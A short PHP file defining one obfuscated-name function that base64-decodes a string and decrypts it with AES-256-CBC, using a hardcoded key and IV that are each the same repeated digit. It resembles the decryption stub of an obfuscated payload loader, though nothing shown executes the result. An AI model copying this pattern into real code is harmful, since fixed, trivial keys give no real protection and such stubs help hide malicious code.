<?php
function e7061($e){
	$ed = base64_decode($e);
	$n = openssl_decrypt("$ed","AES-256-CBC","3333333333333333",0,"3333333333333333");
	return $n;
}
?>
